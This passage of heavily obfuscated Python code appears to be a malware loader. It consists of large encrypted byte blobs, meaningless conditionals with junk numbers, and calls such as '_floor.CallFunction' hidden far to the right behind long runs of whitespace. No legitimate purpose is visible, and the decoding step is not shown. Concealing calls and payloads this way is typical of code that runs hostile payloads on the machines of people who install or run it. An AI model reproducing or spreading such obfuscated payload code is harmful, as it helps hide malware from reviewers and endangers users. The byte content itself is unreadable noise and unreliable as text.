[\xdf\xa2M\xb0\xed\x16\xeb\xe4T\x06\xa6\xd0\xe4\xba\x0e\x1ce\x0bK\xb7\xdd\xbe\xbe\xc3\xf6\xb7\xdda\x15\x9c\x05\x02f\x19G0\xc9*e\xb0/\xdc\xae\xde\x080\xd0~\r./\x96\xef\xc2\x1c\xad\x1e\x84\r):\xbd)\x91:\xd0\xe9\xec\x95VW\xae\xf0v!\x07\xa8\xc1\x8eO0\tC\x9d\xd4=\xac\xb6\xf6\xc2^s\xa2\xb4!K\x12\xcb\xa3\x12\xf6z_\xdf\x03"Mm\x84{\x18\x86\xe6\x10\xe8\x88\xf0\xaf\xb3K\x90w\xd7\xb8\xc7\x12\xcbg2\x147RS\xdf\xc0\xd3\x8d\xe4\x8d\x99\xa8X\x04KV\x9a\xe4\xd7"\xd4\xb037\x1c h\xa8\x92uL\xd8\x99\x1f3\xf4\xb6\r\xb5\x86\xfb2\x9c!\xddj\xdf\x15\xc1\x15\xa5\xa5c\xcf$*\xb0\xae\x96\x99V\xcd\x92\xd3d\\L\xf3\xd4\x950\xe3p\x91\xb8\xa8\xe0\xb0\'g-\xad\xa4v\xb2\x96\r\xdf9\xf5\x0e\x06Y.a\x9d\xe0q\xed\xcf6\xfc^g\x1c0\x97\x15\xe6\x1e8\x9aKF\x1a\x9c\x16b\t\x13P:I\xa5\xad\xb4\xf6\xc2#p\x88T\xd2\xed\x99\xb6\x12\x1ea_\xdfC\xa2)\x07\x8aP\xcc|\x87"\xab\x0b\x7f\x94\xa1LW\'\x8a\xa9r%r\x0f\xf5\xc7\x93[p\xb3RF\x7f\x9aaa\xd4E-\tM\xa5\xd7\x0b\xe4\xfd3\xcd\x9du\x90YRB\xa7\x91\xce\xdftPd@\xd6\x14\x19X\xf8\xe5K\xcc\x92\x07@\x019,j\xaas\'EZS\xc2\xff\x92\x00h\xd3\xb7M-\xa1NT\x07&\xd3tf\xf2Qg&/\xd5\xf25;\xceDEA\xb3\x02z\x97\xbeD\xab\x9a\xbc\xec\x9by\xa1g3\x89Y\x7f\xbfNZ\x12\xd4\xb9\xb8^e\xbf\xce\xae\xbe\xd9a~\x9dC\xc4`\xa10\x98\x97*\x06\xb2`\x9e\x11\xe8\xb6Rv\xec6\x0f\x1b\xa1\xc6\x0b\xe0.O\xe6\xe12\xb9M\xe6Jj+\xc1\x9e\xdd\x02\x1f@8\x8f\xf2(\xc9\x16^\xaa\x80\xdb\xa2\x80+\xc1\xc2\x1a\xdbB\x81N\xf3\xcd\xff;\xae\xc4\x04B\xb9\x8e\'1\x93\xafd\xf1\x9d\xf5\xe0\x87\xddie\xec\xabb\x9f\x80\xaa\xb0BE\x01\x12\xd9 CR\xcd\x93X1\xa4oV}\xfd\xf1\xcb\x9a\xdc\xf6<\xe4\xe2Q\xf8\xd6\xa9\xf2\xe0\xa4Z\x08U\x95\xbb\xb3E]\xbb\x11nI\x05\xd9\xcc\x87%\xa7]V\xa3L\xef\xea\xdb2\x1f\xf8\xc0\x91\xf3\x1dGJ!\x1fx)\xa2\xfb\x85ONU\xec\x9eyF\x13\xfa\xc6\xb6NZ\x81\xedSt\xdd%\x18\xf5\x0b0\xde\xca\x95\xfbJ\xadG\x18\x11\x0c\xc3~s\xd3\xe0\x9d\x8c5\xf4\xe3\xdd\xf0\x87\x89\x00\xe3+\xe3\xf2\xd7\xb5F\x97\xf9\xd6\x19\xef\'r<S\xf1RD\x12A\x88y\xdb\x88`\xdf\xcd\x9d\xc4<HC!C\x92DT\x1e\x12\xdcI\xfb\xfa\x1e\xa0\xdb\x1dH`\x1b m\x1d\xd0\x86\xd9<\xb3\x95\x9a\x87\xa3\xfeQz\xe2\x00\xfeF\xda4\xd2\x01\x93B\xddxof:~7\xd4,\xceCDF\x8c\xaa\xad\x8e\x1c8/\xcf\xc8\x95\xe0\x11\xa47\\4#\xc6\xd8eZm=\xc2}\x7fq\xb4I\xd3\xf30kQ\xc9\x0cx\xed[\x96c?!\x8b\xa5d\xa9.i\xdc\x9cK\x1d+\xb1\x8e\xb7^w\xac\xd9\x98\xf9\xbb\xd6\xdb>.\x9f\x08J\xae\x14%\xd60\x0b\xfd\x91\x1d\xee\xc1\xc5\xda\x16\x975\xd4BI\xb1\x99\x81\xfe\x17@\x1d\x10\xf5\xa0\xdaS\xb1\xd6\x08\x13\xe4\x88\xf1\x13\xe4-j}U\xdcg\xb1\xbd+R\x80"U\t\xe6\x1b\x05H\x80@\xa8\x1a\x88W\x15Z\x1dI\xc0X\xaf\x97\xd0\xbd#]\x15<\xa9\xb6\xbeH\x8c\xacE\xf8\x15\x00\xabk\xdc\xcag\xda\xa4\xfao\x81)\x1ca\xc0a\xa4\xd3\x02C\x8d)\xcc\xcb\xad\x9d5\x1afx4TXI1S>\xa8a\x83\xac\xeb\x1b\xfb\xf3Va\x0e=E\x8d\x94^\x83.\xe8!\xfa\x1d\x13e\x87\x9b\xc0D?M\x11*V^]B\xfdJ(by\x05\xafW-\xf4\x9a\x18\x83B\xc1M\xaa\xabS\xa4\xa8\xd7TZ;]\x1dI\xbd\xc2\xe9%aI\x8f\x94\x9c\x12M}\xfb&\xae\xb6\x90p\xbeeY)\xa6\\\xad\ni"\xcfN}nbn\xf2T\xe3sT\xc3D_\xe4\xa9w\x1do\xfe-\x87\x80v\x05\xd9\n\x89\x846\xbdPG1\n\x89\x86n\xa9\xb6\xc3\xa5GO\xa0\xad`f)\xc3-\xbd\xfa\xccOM3 \xe0\xe9Y\x99\xd0\xea\xa5X\x94\x90^\xaf\x9bu\xd3c\xa9\x7f\xde\xa3\xf6\xce\xa7\xf3\xfb\xed\xd3\xc9.d\xe9\x1a\x12[p3k\xbd\xe5\xcf\x0e\x11\xa3"\xbb\xa7X\xa1\xc9\xb48\xa4=\x91\xf9\xdfe\x8e#.\x17\x91\x96|&\xfb\xfa\xb6)\xf3\xb8\x97\xd0`\x8bU`\xb0\xe2\x17\x16\x85\x81|\xc8\x16\xb0\xc1\x1c\xe7\xf4\x18\x91\xcc\x91\xc68\x0f\xab\xad\x1eG\x1b{\xafe\x051\x8e\x0ese\xc6\xb0\xe4\xe9\xde\xd7\xf7\xc0Q{\x90|\xb8UR]\xcd\x11\x1e+\x8cI\xcb\xbb\xcay\xe9\x94\xf12\xd3\xb5\xd3\x92UJe \x86}}\xb5\xccV\xaf\xff;\x030\x99\xa1\x84o\x12\x89\x12\xc2\x1bF\x000\x9b\xfa\xb6D\x11\x1d_\xd1\xb9xe\xd3Bl\xbaHl@m\xb1!f\xef\xcc\xe7\x17\x83i\xf9#\xdc\xea/I\xe0\xdf\x17\x86\xc0\xa1\xadD\xbc3\xf4v(L\x876}\xdd"\x91w\xbb)\x8aD\xb6\x95\xc4T\xa7\npNpKP?\x11\xe9\x05Jo\x16\x06i\x8aJ1\x80O\x02TK\x13P\x86\xc3\x00\xdd\xe7\x01\x0b\x03p\xe4\xc4}\x13s\x07\xba\xbc\xde\xb3\x86\xa8\xd0k\xab\xd9(B\xefF\x82\xb95\xa9\xce\x93\xa9\xb46\xae)\xc2\xde\x91\xee\xcf\xf6k\\mma\t\x07\xb8\xed\x1c=\xfa#\x9d\xfb8\xaa\xb6\xb6XSD\xb9\xda\x98/\x19h\xce\xc0Q\xb5\xb5\xf9\xf6A(\x7f\x88y]T\xad\r\x8e.\xac\xb6\xf6\x9e\x8fY\xb0\xf2\xed\xc2\xb7QZ3\x1f\xef\xea{@\x01\xeb\x1e\xfe\xf2\x0c\xfd\x8f@u\xb2\xa4\xa1\x9f\xaa\xdb\xdf\xd4\x87\xc7Y.&r^\x18\xe4\xee\x91A\x16\xa7`3\x7f%f\xc3\xc0\x1d\xb9\xf4\x91\x8f\x99<\xf5\x96\x19`\x8a\x19\xd9\xf7\x99H\xac\xd1\x88:\x97\xd1vGT\xa8;\xf2\x1c\xca\x94\xc96\xf3\xc1~:>l\x89\xa9\xe7\x86\xd0\x92{\xc6\x99t\xba\xcd\x99\x1c\x94+\x00\x8c\x12\x1b\xece`f*xa\x9a\xfa\xb6\xbc\xcd\x8fk\x08\xc8\x84\x17\xc9\xa9]d\xd2\x86\x87\xd3\xdb\xd5R7\xfa*vcJ\xa9h\x90+\x7f\xca\xf5-\xeb\xd6mRL\xf1\xf0\xe3H\xac\x96\xb9\x1c\x15\xda\xf1\xd51\xa2>\xc9FY\xa0\xf5\xa8(K\xb3`Ga\xd7\x9a~\xae\x80\x1e\xb8\xa3\xb4\xcb\xd7:\xaf\x8d\xf6\xdd\x8d3\xe9\xbb\x80\x82\x9cLS\x03\xae)3E*y|kC\xa7\xd3\xfd\xac0\xe4\x85+\n\xc8\xcc\xc68\xe1\xb2\x1b\xd62m\xea{\x80b\xf4\xdf\x0ep\x0b|\xa2\xaaBP0@\x17\x18\x02\xda\xee\xeeu\x03\xcc\xfc%\xae\x0egD\xe3\xe7\x12\xb9\xf9\xbe\xbem\x12\x16\x0e\xbc\x9a>\xb9\xfbj\x034#\x19\xa6q\x1b*P2s\xd4s~\x18\x18`-\xe2l\xef\xba\xd6\xb3\xf5I\x90\xe4\xaa\xf6\xd0\xee\x04\x16\x9b\xb0b*\x8c\x8a\xfcv\xc7i+\xd1,\xcd\xb0\xa2I\x08E\x7f\xc0\xfd\t\xa4\xef\t\xa6:b\xd1\xc2\x98J\x16\xe2l\x18\xc4y\x12\xf4\xf5\x1eP\x9db\xad\xdf\xe25\xfe~E\x8b\xbf\x83jZ\x88\xfb\x8e2\x9bel\xff\nt\xeeN\xf1Y\xf3\x9eX\xca\xbdy\xe5R\xc9\xe6\xcf\xfe\xca\xd6\xe0\xd0\x05\x95\x94P\xe8P\xf68\xc1!\x9a0\x1a\xd7\x07\xff\\\xe5*\x8d\xca\xd7\xcbm\x96xE\x19-\xe4\xcb\x142e\x025ZW\xc4i\x08U\x1b\xd4\xe3\xd6\xe4\xca@\x0e\x0c\xfc\x8c\xa6|u!\xb0\xc2h\xa6Z\x13\xfcv\x04k\xce\x82X]+u\xf3\xab\xf1\x0f\x84\x880\xf1\xa5\xb3$\x8e\xf2t\x14\xc3\xdd\x90(\xa5@):\xb1\x9a\xf2\xd5\xe4\x98\xa5Je\x80\xcc\x92\xf86\x1b\xc6\x99z.\xd3<\x99\xc5J\x81V\xd7C\xadE\xa9FC\xa8"\xa1\x14\x91<Q\xb3k\xbc\x88#\xf5\x9bH}{\x0by\xe3\xea\x98\xf2t\x11E\xf1\x02rs\x92!"\xcc\xfaE)v\xdfq\xb2LBV\xb8\xf3*x\x0c\xb7Y\x81\x8ep\x9e\x03[o\x8c\x12\xc8q\xc1\xa3>\xdc!L\xfc\xf2.\x13\xaa3\xb5\xd5D\xef\x17\xcd$\xef\xbb\x19P\x983\x9f\x03\x8d\x1cm2\xa9\xab\x82\x01eW_\xc3\xac\xfb+\x83\xc8\xef\x07\x9d\xca))+MZ\xde\x00K\xfe\xc0\xb4\x86\x1c#+\xe9\xc3\x92&Cx \xdc\x1eaJ\xc2\xdbWT\xb1H\x9b\xe7\xbb\xa2\x95G\xb2\x9a\x92\x8b\xdd\xa6K\xce\x05H\xc8Rs\xce\xda\xb8\xdc\xbf\x1fxE*BE\xc2\x9db\x9d\xbf\xe6c\xd8\xcc\xeen\x17\xb3\xd7\xc8!\x0e;\xf9Y-m\x00\xa1\xbb\x86\x85\xcdx\xd7~u\xd8\xe1\xb2\xf6V\xf6\xa3\xbb\xd5\xe6\x1206\x94a\x15\x83~\xe0\x01\x83\x11\x8b\x1cg\xfb4\x95\xb7\xbb\xf22\xee\xba1\xfcT\xcf\xda\x85.)\xe1H*\xcc\xc8\x05\x1c\xbdS\x1d\\i\xd9Y!6W[\xd7>U')

        if 475330 > 6870896:
            _add.Divide(_cube = -2287 + _add.Floor)
        elif 103474 < 9676370:
            _add._builtins(Random = _add.Floor + -22608)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='ljjllliljlijlljllij',Positive=b'\x9f\xa0\xba}\xa2\xdas\xd4A\xfd\xd4\xb5\xcfuNq1\xc7\xd8\x8a\x0c\xb7\xb9\xd5\xfdk\x8f\xef\x81\x86\xd82\x8f\x04\x07a\x96#.\x05iyEc\xa7T3\xae\x8a\x14\x92yO&>Z\xfb\x9d43\x86~1\xd1\x04\x17\xc0\x93\xb5_CA:\xd2\xd4\xd7G\n\x90$\xa5\xf0\x93\xcaUL\xde\x92)0\xf2\xd6?"\xba\xf3\tQ\xd9\xe8$h\xfc\xb2\x1b\xd5\xb9\xc7\xd4-Gq\xba\x01\xe6\xc5\xc0\x0c\x0c\xaa\xc3\x1a5\x88us\xde7\xb1\xc3\x86\x88YI\x11\xb7B\xcc\xff\x95\xd6^\x06\r\xc3\xe6\x18(\xc5<\x86I\xc9\x98\xd9\xd5\xafe\xa9\xdc\x0e\xb7\xcc\x12M\x99e\xdf\x93\x8fmV=\xdbh\xde\xf3\x17\xc4\xbb9\x05Y\x1f\xe8Z\xc0B\x0b\xfe8\xce\n\xc9\xa2\x16\xddV\x84\xb2:V(j\x08K\xe0\xf8b\x9dxx\xdb7\xb1\x14\xb6\x0e;B\xaf\x1a\xc6\xdf\x18n\xdd\x0fWL\x05\x1e*K\x04\x0b\x92\xb8\xd3\xda\xf4u_\x98\xda\xd9l\xae\x89\xa0\x99\x14\x9aj!615@\r\x9e\xd1\r\xd5\xcd\xa5*\x03\x94\xed\x18U[\x8f\xd1E\x95\x81b\xd1k\xb8}\x80\xbf\xf7\xe4\xabC\xa6G\xe4|lt\xdb9\njiS\x11\xe9\x0f\x88\xf7\x00`\x9b\xea16$\xdfL\xbdq\xb0}\xa8\x19\xb1\xe2TP\x1e\x1a\xae\xacU\\\xe4\xcer\xab\xa1:\x9c=\xa6X\x1c\x9aj8\xc0\xf2\xc5\x91\x95"vW\x07\x16\xe2\xe9\x84\xa6\x80\xb0z\xd0\xa6\xecr\x9f\xe9O\x86\xd1s\xf1\x1e\x08]#\x11\xf0\xb3\xa6\xbe\x9e\xf4\x90r\x96{\xacA\xd4\xfe3BK\x15.\xca,\xf8\x8b\xce\xdc\xf7\xfb@\\\x10%\xebw,PM\x9d\xdcf\xf0~\x81UO\x9a\xf3\x902\x9d\xd5\x1eki\x1fa\xbd\xcfQ\xb5\xf5\xf8f\x0137\x8f\xc4Sb\xa13\x01"i\xd3\xd7\x03\xebe\xa9b\xcaR\xb8~\x8buU\x16n\xc7T\x96aHB\xf3B\xb8\x01\x80l\x88\xfeT\x13\xa1\xe2w-\x94\x8c\x08\x89\xc5\x81\xb2\x81\x88\x07H\xc9\xa8\xb4\xfe\xca\xf5\xfd(\x1d)\r\x98H\xa8\xbd\xe9\xfc\xd5\x90}\x1drV\xba\x82\x8f.\x9e0\xb8\xd8\x92\x87\x1f\x18\xb4\xa8^\xa4\xc7+/MgN\xf9\xe4\x12\x01\x9c@\x91\t\x94YS\xdf\x96T~\x07\x8a\xb1Qi\x8b\xa1\x1e\xaf\x8cV4\xc6\xbf{\xf1T\x08\xb5\xd7\x92 8\x15J1\xe2u=\xc4\xd6JT4u^9AH\xe30\x19\x19G\x8b\xbe^\\\x8c\xa2M\xde\xe3\xe1x\xc1Q\x013X\xc5\x0e\x9aO\x0e\x8f\x8e\x95\xe76\x95g\xbb\xd1A\x97H\x12l%\xe6\xd40\x95\xd3r\xeb\xe8\x1b\x02\x93A\x87\xc6rS\x80W%\x9a\xbe\xf1\x07\xc3\xef\x8fh\r\xb0\xf6\xf6\x99V\x03\xecIf!-5\xd5\x02xy\xbc\xe3\xa1\x00$\xd5\x10\xae8e\t\x00Hq\x80\x12\x1d\xfd\xe3\xa0ns ,\x03R_(\xae\x10\xf5\xf7\xe9\x84\x04\x9a\xb7\x8c\x0c\xc7v\x1a]1\xa3\xa1\x11\x0f)\x97\xf4\xf2\xdc&\xf1\x92\xa8\x96BL@\x04J\xc3\xe1M\xf2#\xd4\x85\xa8\xb4\x1ea6\x81+\x03xo\xa2XY\xdb\x91an\xa9\x0395\xc8\xc2\x8c\xf0.\x1eu\xb9j\x19\xc5ByEk"\xb8-\xaf\x18\xa4a\xcc\x94\x03\xbd\x9c\x16,HI\x92\x92\xf3\xacq\xb4\xc7\x9a\xc0*\xd3\xe3[iv?$\xe5\xb6#\x1c\xe9}\x0b\x02\r\xb4?\xcf\xbct\xa6\xd2e\xf2-\xae$\x17\x0b\x8d5e\xc7\x8c\xc8\x84i\xea\xeb#\xe6\xea.\'m@\x06\xa7\xc6\xf6\xe0_\x8b\xe0\x1d\x91\x06\x8et\x81\xdc\x18\xd3\xc6\xd3j\xebq\xe13{\xcf\xfd\x7f\x97\xa4\xfd\xe5Bi\xb2T\x1a\xb7\xb8\xcdLD\r\xe9\x16\xa9\x03o\xeb2\x12\xe5\xf7\xae2\x11\xaf\x809p\x02\x04\x82\xeau\xa2\x16//\xf1\xe5\xd8\x14)G\xb8a\xac\xcd\x19\x04\xb6pl7\xcf\xbf\xcf\x1c\x14\xc0\x8e\xa1\x1a\x9d\xacb\xa3,@=\xb2\x9e)\xa7\xb4mb-\xbb\xd6\x9as\xd8"\xe1\x94*\x0c\x0fQa\x8c\x10\xa7\x00B/\xae\xb6\x1e\xe3\xe4\x9a\xc4q\x12/\x92\x9e\xe9\x89Z\xed\xd6<\xe2\xdfZ\xd1\x9e\xc4H\xd812\x15DG\x9a\xf0\xb5\xd2\xfak\xf6N\x1a\x0e\x01I\xc1\xcay\x93\xa60P\x89o\xa0\xae\xaf!M\xebG\x98\xa6\xf9it\xc0SXKG\'\xcel|\xbe\xaf\xf2\xf7\xceTn~\xf7\xd6\x06\xea;\x87\xef8\xaf\x99\xfd\x92|\xd5L)\x12q5\x9b\xfaz\x006\xf4\x13\x82\x88\xd9\xda \xe4{\r+n\xa44~qtZ\x05\x07\xe3\xa3\x8a\xb2\xe5\x8c\x98\x89\xcc\xd3<eO\x99\xf9\xcem\xda\x1e\x01\x86\xd3[\xe2\xae\x82\xa4=_po\x06\xcer\xb1+[:4\xf5\x01\x9e-\x81\xd8}1f\xe8\xab\xc5Y\xc1\xf3\xd4\xb2\x7f\x08\xe2\x1e\xa7\xc7\x95$\xca\xb4K\x94\xf6\xa54\xeeE\xec\x80\xe8\xe6\xde\xb0\xddP6p\x8b\\\xef>3\xa0o\xce\x0b\xd7\x99K\x03\xa8\xf9\x82\x01v\xaa\x03\x83\xe5_\xb6\xcd\xc1\xf6\xef\x91*\r\xf7\xf2<\xcb\x81\x90K\x1d9\x84\x84WY\xa83\xe4{Ii\x0c\xe3a\xaa\xce\x14\xf09P\x0e\xa7\xdb\xf1\xbf\xa4\x7f\xfc\xef\xd2F\x16%\xedfL\x81fj\xc2Z\xca4lq\x9d~\x92\x16\x8c\xa3\xda\xf4\x138?#(\xa6\x88L&\xf0M\xdf\xf4\x93\xc1\x05\xe6\x8diZ^MQ3\xed\x9a\x7f\xca\x99\n\xa1\xd0\x9d\xd8\x9b\xc6\x19\x0c\xaco\xb5\xe9\xebA\xdfr\x05D\xc3\xcf\xfa\x0b\xea\xa1\xfe\x8e\xec\xa6\x06\x17\x0c\n1\xa5\x9e\x8c\xd4!\x87\xb5N\x98B\x0f\xcfe\x96M\x98\xd2\x061\x8bL\xf0qW~\xbe\xc1)\x90\xc46qn\xba\x99T\xf79a//\'\xf0\x98@9\x0bp?M\xa0\x98E\xa3\xfb\xe9x\x13\xdca\x0c\x8d\xd2\x10\xe8\x91jG\x8f\xfe\xce\xeb\xb81\x14\xc3\xa9\xa1\x19\xe6\xdc1I;\x9c\xea\x96\xe3\xe4=\x98\x12\x19\xd4\x16@\xab\x98\xea\xbfm\xa4\x83zaW\x89\xbbz\xac1BWP\x1d\x88t\xb6h\x80,\xa71\x13\xfd\x82\x92\xa0\xdeoS04Fj=p\x8e\xa1\x02\xe1\x10\xa3\xcb+\xf5\n\xec\x1b\xb0\x05\xe8\x05\xe1z\xa2\xe9\x82\xb0\\\xa6Z\x96}\xab\xe9\x198\xbb\x06\xb7#|\xa1+\xa6\x9d\'.v\xfb\x0c\x85\xe3\x00\xddB%*\xf0]\xfd\xda\x80G\xbe\x8b\xa3\xf9Y\xa3\xef\xb9\x9aw\x0b\x1f\x14xZ\x877P\x81j\x88\xd5\xa7\xc0IH\x9e\xd6Jkg\xc0\x1a\x9f\xbf\xa1P \xb8=\x14\xe7\xbdM\xdf\x96\xe7\xfe\x988\x98JA\xf0E1\x18n\x11\xd8\xfc\xea2\xbc\x93\x02\t\x84\xba7=\xc0\x19$D\xab\x0c\xd9*\x92\\\xbc GQ\x8d\xe9\xb3\x1f(\xe4\x83\xf0\xa3\x0cl+\xd4\'\xeax6\x88\xa9;EHA\x82w%\xd5\xd7\x00\xb0A\x80\x15\xb4L\xab\x13-\x06\xc2\xce12\x7f\xd3\xfa\x13D\xd1\xa7\xe56\x8f\x1aSV#}\xd9\x0c15:\x04\x16\xbe\xa9\xef\x01P\xd7\x16\xf4\xfc\x03P\x0f\xd0\x14\x0bHU\xd8N\x03\xc4\xe7\xb5\x00\x90\xe7\xea\x1c\xc2\x99\x8c0p?B\x80TTmu\xa2w\x00\x13\xfe\x08\x01W92\xbac6\x1c\x1co\xb5\xd5\xa3\x9e\xc3\x92\x9c\xf3\x11%\x95\x11K\xfb\xb8T\xe1f_\xdf\x96\xe4\x98}8\xe0A/J#0\xf2\x95D\x89\x89\x03>\x05\x1a\xdf\x9e\x11Q\xa4Q\xc1\xb4\xed5\x12\xa9\xc0Va\xf3\x9f;\xdb\xf2yb+\x97\x04\x89M\xa9fv\x82X\xd8\xf2M}\xdd\xb3\x8ez\xc5\xd4\x19\xd6Jf\xa6f\xaeZ\xe6\xb3\x94\x91\x86\xae&+\x15g\x08P\xb8\x0e1\x8d\x08n\xa0\x00Ku\x0eek\xa7+\x18\'\xb6\xec\x01+\x98\xcc\x85n8aEZoS\xdf\xb6\n\xd2^\x8c\x92\xb2\x8b\xaf\xc0F\x86j\x8f`\'O&\xcaFn.\xf5\xd8O\xd83\xaf1\x8f\xd10\xb1<g\x98\xd8$\x84}S_O\x06\x95e\xd3\x02\xc1\x90\xac\xfc\x15I(\xb0\x92g\x02#/\x1f~\xb8u\x7f\xedF\xe3.t>K\x84\\K\x07~\x9f\x19\xd9ab\x90n\x11V\x08\xad\x89\x91\xf7v\x07\xc6\xaa\xd8\xc3\x15\xcaj\x8bl\x85\x98\x8a\x1bP\x16e\xd0\x11y\xc4\x02\x87\xa7\x8cr\xee!\x01/\x8bu\\\xf6\xf5\xf5\x81m0\x08\xa6\xbe\x00\xcd\x8d\xce\x08\xdc\x98\xdc\xc0V\xa0\xf7Ts\xa9\xc0T\x10\xa1n\x9eW[{M\x11\xc3\xa4H\x13\x1e\x0b\xcd((M\x11\xbb\xfa\xe2\xd58D8~\xc7\x1a\x8c3\x03\x0b\x98\x89)>7\xd3;C\t\x0c\xa4\xc0m\x10\xdaqa\xb6\x01\x83\xcb\xdfkv\x06x\xe9<Y\xe6\xe2z\xa6\xe2\xce\xc2\xf1P\xca\x10\xde\xd5\xafe\xc1\xb2\x03\x80Y\x9c{,\x93\xc8\xe4HD\xd5\xd3G\xeaU1j!\xd3\xadl\x14\xc3\xbe;M"\xb5Y\xfd\xfe(qJ\x9cz\xd5O.\',W,.\xef)\xdb\xccp\x91\xe8\xbc\xb3c\x0b\xbf\xe1\xcc\x9b\x82\xdb\xb7\xe7l\xcb\x11\x03,\x1e\xa2f\xdac\x03\xf9\x86\xec*C\xa6\xfd\x05jkX2\xbe/M\xc35\xed\x82.M\x1c"\xd4\xb7\x19\xe1\xfbk\x8a\x9a\xb8#\x85\xda\x95\x0c[$\x05\xceJ\x9e\xd4\x82\x87\xd5-\xabB\xff\xfa\xd4\x1a\xdcM\x17?\x0c\xf5\xe2\xb1\xdd\xe6J\r/x\x8ak\xd5\xf0\xfatSO%\xc3lB\x87L\xf3(\xa6\x06:5D\x1c\x81*\x00}\x12PJ\x03\xf9<\x83V\xe2np\x9a\xa3\x97:Fo#x8#t\xa3$\xc5\xb6c\x04\xdc\xbd\xbcD\xd0\xb1\xf3\x98y\xaeR\xcbre\xc0\xa5\xa65vL\x8a\xb1R&}\x88@\xbb\x04X\x8ap\xba\xc0\x02\xaf=\xa3\xeb\xf5\xd1\xb1\x99\xa0\xd5\xce\x0b\xc4\xdb\x92\x88\xdbm\x91\xb9\x9cR\xfa\xdc\x80\'\xafuf\x8b~7)/\x8d\xf7\x03\xf9\xfa\x81\x8d(\xd1\xf5_G\x18\xd1\xa9\xb4z\x9cKe\xc5U\x06\xd3K\xc2\x90\xa1\xb0-\x9b\xfa\x06\x87\xd9\x96\x073\xe4e\xc8\x90\x05\x1cY}\x0b?\xdd\x1bD\xb0\xa6\x0b\xd6\x15\x82<z8\xd9S\xc9\xe4c|\xd2d%7\x99\xb3\xd2\xd4\xd7\x0bs\x8b\xe7@\xb80\xcfx\xa9\x083s*\xc8\x8aY\xbb\x8b$\x86P\x8e\x9f\xea\x01\xf6\xa8\xa4\xb1)\rR\xc9\x07\xe2\xc9\xfct')

        _add._builtins(Random = _add.Floor / -92552)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='jjiljliljjilililjjlijjl',Positive=b'I#7\xf8\xf6\xfcl\xb2\x99\xe8\x9f\x12\x9b:\xbb\x0f\xd9\xfc\xe7q\xcd\x8e\t\xe3\x1a\x14\xee\xc3\xa6\xbe\xee\x1d\x17\xe9\x01&\xc5\xe1\xbc\x08\x8b\x02QZ\x91\x88\xaf\x0c\x07\xf1\xcdo+|\xf98^@\x81A\x07W\xb8\xc2qC\x05\xae\xfaR\xcd\x0fP#\xc4r\x8a[\\\xdan5!dG\xd2K\x11\xdb\x91\xeeL\xae \x8cNg\x11\xe7l\xea\xdb\x86\xd1\xe8P\x07\xb4\x1bG\xd0`\x8a\x99\x18\x98\x82\x00\x9eV\xca\xc682k\xaa7}\x04\xf9\x0b\xb4\xab\x806\xd8\xc2|\xc8\x90\xcaw\x84%\xee#\xe4\xda p\x83hk\xe1\xaa\x0f\xd0!\x9fjv\x8e\x0c\xe1ny\xb5\xd5\xa3.\xd0\xc1\\966\x9b\xb2\xbb\xb5\xfa\xeax>\xc7\x1a\xca\x00g\xcb\xf2\xfa\xba\xc9\xf4\x9dW\x88\xf3\\\x94\xf8\xb0\xb9&\xd5\xd2\x1f3\xd7\xc5?RQ\xe0\xc5S\xc9\xba\x91x\x95\xe5\xebFu\x15\xb9\x1cC\x14!\x8b\t#\xc0\xc0\xd1\xa5t\xcf[5v\x16X\xe5"\xc8\xa0\xd8\x8b\x9a\xa7\xd4\xf1\xa7\xb8\xf5<\x9b\xf5s_p\x9e6=`\xf9\xd8\xfc\xb4\x0eh\xc0\xb9t\x9f%3z\x99\x19DS\xd6]N\xae./\x91\xde\xe3\x92\x1e\x93\xcb\xc3h\xc0\x07\x1b&e\xd5\xcd\xad*-\xec\x86}s\x0e\x93d\x01H\x84\x8e \x19\x86\x9a\xfaz\xb8\xe2\xee\x83\x8dw\xba\x14\x0e\xd68nW\xf8\xb6-\xa00\xc5\xa0v\x80\xb8\xa7!\x86\xb6!\xd8\x9dU[_rn<\xb0\x94R\x7f\rw\x97$\x95eZ\xebXHK5\r\xdd\xe6\xba\xa7\x11\xd2ng\xe9\x12\x8b\xd3\x8e\x92a\xd9\x81\xd7\xb7\x9e\xf2\xbd\x19T\xf4 \xffI\xf3\xc8R\xbaY\x80 \x88\x14\x01\xa7\t\xba\xba\xc2j\xeb1\x06\x84t\xdeg\x02\xf3\x13\xa1\xbf\xe0^\x05IP\x9b\xff\x19G!\xe6\xc9\xe6\xf8\x9e\xa8\x16?\xe5\xc7\xb8*a\x1e\xdb\x1a\x85\xb2j\xa1\xe3\xecW\xcc\x1f\xf6VK\xb2\xe81\xb1\t\x876\x94\xef\xdeC\xe4\xaa&\x13\x819tnR\xe7\x10\xb7\xa4gf\xcf\xeb.OlS\xdf\x03<\xb1\xc7E\x13bc\x1cL\x9aa\xeb\xceQ=\xba\xd8\xb4\xba\xa5\xd38h\xe2\xe9^V\xad\\5qYiq\x8a\xe5\xf0`\x04\x15\x9dY\xd5\x1a\x00GZKB\x13\xd9Zr\xa6\x96\xda\xff\x11\xf3\x808\x92_;nDN\xda\xa5[\x8eS{m[*nM\x977"\\\xe8\xe46\x99gY\xb8H\x16\xd9\xad\x9aE\xe3l\x91\xcc\xc3e\xa15\xadi\x0b\xa3$\x9cG\xc0d\x11d=\xa9\x8f7\xfc\x95\x062v\xb4=<r\xa1(\x9d\xa2\xc5\xa3$\xb0\x83$@\xcc\xcf(\x0c\xa2\xb9z\xaa\x1e\xa8\x9d\x1c\xf8H\x02\xac\r\x016KdRWi\x8d\xc3\xba5&\xc8\x1e\t:(|\xc2~a\xd3\x96\x13S\xecC\xc31\xe8wQ\xf1w\x18\xe5Y!\xbb\x93\xda\x17\xdd\'\xeevT\x05t\xbb\xe1\r\xd7\xebL\xba\xae\xb3\xf2\xe8\xe5\xbd\xf8\xa0\x91\xa3\x1a[GZG\x0b\xf5;\xb8!\xc2\xd8\x91\xa6\x02\x8cP\xfd\xae\xb4\x1e\xa3\x98\xebM\x9d\x828x\xcd\xed\xc3P\xe6\xee\xd4)\xec\x0e\xe0t\xaa 